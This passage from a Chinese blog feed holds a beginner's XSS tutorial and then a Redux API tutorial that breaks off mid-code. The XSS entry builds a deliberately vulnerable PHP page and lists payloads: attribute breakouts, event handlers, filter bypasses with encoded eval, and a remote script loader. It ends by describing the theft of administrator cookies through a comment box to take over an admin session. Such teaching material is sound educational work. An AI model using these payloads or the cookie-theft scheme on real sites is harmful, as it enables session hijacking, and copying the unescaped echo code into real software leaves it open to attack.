    <content type="html"><![CDATA[<h1 id="XXS攻击"><a href="#XXS攻击" class="headerlink" title="XXS攻击"></a>XXS攻击</h1><p>参看：</p><p><a href="https://www.freebuf.com/articles/web/40520.html" target="_blank" rel="noopener">XSS的原理分析与解剖</a></p><p><a href="https://www.cnblogs.com/hellojesson/p/6386002.html" target="_blank" rel="noopener">前端安全 – XSS攻击</a></p><p><a href="https://blog.csdn.net/a401461843/article/details/77622299/" target="_blank" rel="noopener">web大前端开发中一些常见的安全性问题</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>XSS</strong> 是面试时，hr提出来给我的，然后大体的浏览一遍，今天才查阅资料大体了解了它。</p><p><strong>XSS</strong> 攻击：攻击者向HTML页面传入恶意的HTML或JS代码，当用户浏览该页面时，恶意代码执行，达到攻击的目的。</p><h2 id="原理实现"><a href="#原理实现" class="headerlink" title="原理实现"></a>原理实现</h2><p>在本地搭建PHP环境（使用phpstudy安装），然后在<code>index.php</code>文件中输入一下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">  &lt;title&gt;XSS原理重现&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  header(&quot;X-XSS-Protection: 0&quot;); // 0： 表示关闭浏览器的XSS防护机制</span><br><span class="line">  error_reporting(0); // 加上error_reporting(0);就不会弹出警告了</span><br><span class="line">  $xss = $_GET[&apos;xss_input&apos;];</span><br><span class="line">  echo &apos;&lt;h5&gt;你输入的字符为&lt;/h5&gt;&lt;br /&gt;&apos;.$xss;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>现在在输入框中输入<code>abc</code>普通字符串，然后在页面中显示：</p><p><img src="/view/posts/12cd2a8e/loading.gif" alt="loading"></p><p>之后查看页面代码，就会发现页面上多了一行代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS原理重现<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"xss_input"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    /*------多了的代码：123-------*/</span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>你输入的字符为<span class="tag">&lt;/<span class="name">h5</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span>123<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，我要是在输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>这种可以被解析的代码时：</p><p>现在页面就显现出xss漏洞了。</p><p><img src="/view/posts/12cd2a8e/loadinga.gif" alt="loadinga"></p><p>之后查看页面代码，就会发现页面上多了一行代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS原理重现<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"xss_input"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">/*------多了的代码：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'xss'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>-------*/</span><br><span class="line">// 代码出现在 br标签 和 body标签中</span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>你输入的字符为<span class="tag">&lt;/<span class="name">h5</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'xss'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="xss利用输出环境来构造代码"><a href="#xss利用输出环境来构造代码" class="headerlink" title="xss利用输出环境来构造代码"></a>xss利用输出环境来构造代码</h2><p>现在我要改变 <strong>xss</strong> 攻击：</p><p>以上测试是在，标签中插入<code>scrpit</code>标签达到攻击的目的；现在我想要在<code>html页面标签</code>的属性中插入<strong>xss</strong>攻击代码。因此，当你我输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，不会显示出弹框了。</p><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">  &lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;center&gt;</span><br><span class="line">    &lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt;</span><br><span class="line">    &lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">      &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot; name=&quot;xss_input_value&quot; value=&quot;输入&quot;&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">      header(&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">      error_reporting(0);//加上error_reporting(0);就不会弹出警告了  </span><br><span class="line">      $xss = $_GET[&apos;xss_input_value&apos;];</span><br><span class="line">      if(isset($xss))&#123;</span><br><span class="line">      echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$xss.&apos;&quot;&gt;&apos;;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">      echo &apos;&lt;input type=&quot;type&quot; value=&quot;输出&quot;&gt;&apos;;</span><br><span class="line">      &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">  &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>页面效果：</p><p><img src="/view/posts/12cd2a8e/1562307165857.png" alt="1562307165857"></p><h3 id="输入一"><a href="#输入一" class="headerlink" title="输入一"></a>输入一</h3><p>当我在输入框输入<code>qwer</code>字符串时，会在输出框显示我输入的字符串：</p><p><img src="/view/posts/12cd2a8e/loadinga-1562307323724.gif" alt="loadinga"></p><p>此时网页代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h6</span>&gt;</span>把我们输入的字符串 输出到input里的value属性里<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h6</span>&gt;</span>请输入你想显现的字符串<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"xss_input_value"</span> <span class="attr">value</span>=<span class="string">"输入"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"qwer"</span>&gt;</span>  <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="输入二"><a href="#输入二" class="headerlink" title="输入二"></a>输入二</h3><p>现在我输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，字符串正常输入，明显的可以看到，并没有弹出对话框：</p><p><img src="/view/posts/12cd2a8e/111.gif" alt="111"></p><p>此时网页代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h6</span>&gt;</span>把我们输入的字符串 输出到input里的value属性里<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h6</span>&gt;</span>请输入你想显现的字符串<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"xss_input_value"</span> <span class="attr">value</span>=<span class="string">"输入"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>&gt;</span>  <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分析输出代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>&gt;</span>  <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="输入三"><a href="#输入三" class="headerlink" title="输入三"></a>输入三</h3><p>如果我输入<code>&quot;&gt;</code>，就会变成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span> "&gt;  <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>input提前闭合了！之后的<code>&quot;&gt;</code>就被舍弃了，变成了普通文本。</p><h3 id="输入四"><a href="#输入四" class="headerlink" title="输入四"></a>输入四</h3><p>如果我输入：<code>&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><p>显示效果：</p><p><img src="/view/posts/12cd2a8e/asc.gif" alt="asc"></p><h3 id="输入五"><a href="#输入五" class="headerlink" title="输入五"></a>输入五</h3><p>现在我不想显示弹框攻击了，我想触发某种事件实现攻击，那么就输入以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" onmousemove="alert('我就测试一下')"</span><br></pre></td></tr></table></figure><p>显示结果：</p><p><img src="/view/posts/12cd2a8e/asc-1562308830171.gif" alt="asc"></p><p>页面代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h6</span>&gt;</span>把我们输入的字符串 输出到input里的value属性里<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h6</span>&gt;</span>请输入你想显现的字符串<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"xss_input_value"</span> <span class="attr">value</span>=<span class="string">"输入"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onmousemove</span>=<span class="string">"alert('我就测试一下')"</span>"&gt;</span>  <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>说明：输入以后，鼠标在移动是触发事件，形成xss攻击。</strong></p><p>那么，我在<textarea> 标签中显示呢？</textarea></p><p>此时就这样输入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(‘xss’)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 就可以实现弹窗了</span><br></pre></td></tr></table></figure><h2 id="过滤的解决办法"><a href="#过滤的解决办法" class="headerlink" title="过滤的解决办法"></a>过滤的解决办法</h2><p>假如说网站禁止过滤了script 这时该怎么办呢 ？</p><p>那么就需要记住：<strong>只要页面能触发你的js代码</strong></p><p>有哪些方法呢？</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 当找不到图片名为1的文件时，执行alert('xss') --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">scr</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 点击s时运行alert('xss') --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascrip:alert(</span>'<span class="attr">xss</span>')&gt;</span>s<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 利用iframe的scr来弹窗 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">xss</span>');<span class="attr">height</span>=<span class="string">0</span> <span class="attr">width</span>=<span class="string">0</span> /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- 过滤了alert来执行弹窗 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">eval(</span>"\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>")&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="xss的利用"><a href="#xss的利用" class="headerlink" title="xss的利用"></a>xss的利用</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">scr</span>=<span class="string">"js_url"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">appendChild(createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'js_url'</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><strong>比如我们在网站的留言区输入<code>&lt;script scr=”js_url”&gt;&lt;/script&gt;</code></strong></p><p><strong>当管理员进后台浏览留言的时候，就会触发</strong></p><p><strong>然后管理员的cookies和后台地址还有管理员浏览器版本等等</strong></p><p><strong>你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，</strong></p><p><strong>就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XXS攻击&quot;&gt;&lt;a href=&quot;#XXS攻击&quot; class=&quot;headerlink&quot; title=&quot;XXS攻击&quot;&gt;&lt;/a&gt;XXS攻击&lt;/h1&gt;&lt;p&gt;参看：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/4
      
    
    </summary>
    
      <category term="JavasCript" scheme="http://yoursite.com/categories/JavasCript/"/>
    
    
      <category term="JavasCript" scheme="http://yoursite.com/tags/JavasCript/"/>
    
  </entry>
  
  <entry>
    <title>redux</title>
    <link href="http://yoursite.com/posts/a8054c2.html"/>
    <id>http://yoursite.com/posts/a8054c2.html</id>
    <published>2020-02-18T09:44:20.000Z</published>
    <updated>2020-06-18T07:09:21.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="redux"><a href="#redux" class="headerlink" title="redux"></a>redux</h1><p>作用：集中式管理 react 应用中多个组件共享的状态。</p><h2 id="核心api"><a href="#核心api" class="headerlink" title="核心api"></a>核心api</h2><h3 id="createStore"><a href="#createStore" class="headerlink" title="createStore()"></a>createStore()</h3><p>作用：创建包含指定 reducer 的 store 对象</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createStore&#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"><span class="keyword">import</span> reducer <span class="keyword">from</span> <span class="string">'./reducer'</span></span><br><span class="line"><span class="keyword">const</span> store = createStore(reducer)</span><br></pre></td></tr></table></figure><h3 id="store"><a href="#store" class="headerlink" title="store"></a>store</h3><p>作用：redux 库最核心的管理对象</p><p>它内部维护着：state 和 reducer</p><p>核心方法：<code>getState()</code>、<code>dispatch(action)</code>、<code>subscribe(listener)</code></p><p>编码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">store.getState()</span><br><span class="line">store.dispatch(&#123;<span class="attr">type</span>:<span class="string">'INCREMENT'</span>, number&#125;)</span><br><span class="line">store.subscribe(render)</span><br></pre></td></tr></table></figure><h3 id="applyMiddleware"><a href="#applyMiddleware" class="headerlink" title="applyMiddleware()"></a>applyMiddleware()</h3><p>作用：应用上基于 redux 的中间件(插件库)</p><p>编码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createStore, applyMiddleware&#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">'redux-thunk'</span> <span class="comment">// redux 异步中间件</span></span><br><span class="line"><span class="keyword">const</span> store = createStore(</span><br><span class="line">counter,</span><br><span class="line">    applyMiddleware(thunk) <span class="comment">// 应用上异步中间件</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="combineReducers"><a href="#combineReducers" class="headerlink" title="combineReducers()"></a>combineReducers()</h3><p>作用：合并多个 reducer 函数</p><p>编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export default combineReducers(&#123;</span><br><span class="line">user,</span><br><span class="line">chatUser,</span><br><span class="line">chat</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="redux-的三个核心概念"><a href="#redux-的三个核心概念" class="headerlink" title="redux 的三个核心概念"></a>redux 的三个核心概念</h2><h3 id="action"><a href="#action" class="headerlink" title="action"></a>action</h3><p>作用：标识要执行行为的对象</p><p>包含2个方面的属性</p><ul><li>type：标识属性, 值为字符串, 唯一, 必要属性</li><li>XXX：数据属性，值类型任意，可选属性</li></ul><p>例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> action = &#123;</span><br><span class="line">    type: <span class="string">'INCREMENT'</span>,</span><br><span class="line">    data: <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Action Creator(创建 Action 的工厂函数)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> increment = <span class="function">(<span class="params">number</span>) =&gt;</span> (&#123;<span class="attr">type</span>: <span class="string">'INCREMENT'</span>, <span class="attr">data</span>: number&#125;)</span><br></pre></td></tr></table></figure><h3 id="reducer"><a href="#reducer" class="headerlink" title="reducer"></a>reducer</h3><p>作用：根据老的 state 和 action, 产生新的 state 的纯函数</p><p>样例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">counter</span>(<span class="params">state = <span class="number">0</span>, action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'INCREMENT'</span>:</span><br><span class="line">      <span class="keyword">return</span> state + action.data</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'DECREMENT'</span>:</span><br><span class="line">      <span class="keyword">return</span> state - action.data</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：返回一个新的状态，不要修改原来的状态</p><h3 id="store-1"><a href="#store-1" class="headerlink" title="store"></a>store</h3><p>将 state,action 与 reducer 联系在一起的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createStore&#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"><span class="keyword">import</span> reducer <span class="keyword">from</span> <span class="string">'./reducer'</span></span><br><span class="line"><span class="keyword">const</span> store = 